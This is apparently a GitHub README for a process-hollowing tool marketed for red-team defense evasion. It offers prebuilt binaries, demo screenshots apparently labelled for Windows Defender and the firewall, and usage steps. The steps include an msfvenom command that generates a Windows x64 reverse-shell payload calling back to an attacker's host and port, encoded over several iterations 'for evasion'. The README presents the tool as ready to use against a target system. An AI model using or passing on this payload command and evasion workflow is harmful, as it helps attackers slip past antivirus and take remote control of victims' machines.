# Process-Hollowing-RedTeamOps
##Red Team Operation's Defense Evasion Technique for executing without raising flags on Target System.

We have both x86 and x64 bit release as you want. **we strongly suggest x64-but release if you're bit confused about compiling manually**

We suggest to use directly compiled executables as in some situations it depends on your compiler.


**If you wish to Compile x64 bit relese on Kali with cross-compiler - x86_64-w64-mingw32-gcc** 

**For 32-bit - Mingw for Windows**


## Demo

![windows-hollow](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/cbc55b11-94c1-4416-a200-43f76abc9baf)

![kali](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/4a258dcc-0f40-4ec7-9422-1422a97686c9)

![win-update](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/a9421032-566d-49f0-a0a0-9857395a5624)


![firewall](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/96c3d3cd-6708-4640-83f0-e44c4a642907)


![windef-2](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/ca002758-e1e4-43b3-be87-7a59242f80f5)

![windows-def](https://github.com/vatsalgupta67/Process-Hollowing-RedTeamOps/assets/71017420/dc8b587a-10f4-4408-8203-539640b50cde)

# How to use

***1. Generate a .bin file only - You can use C2 servers and metasploit too***

Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
  
 ***2. Obfuscation is mainly your work to do as per your operations. The other one's? - WE'LL HANDLE!!!***
  
  
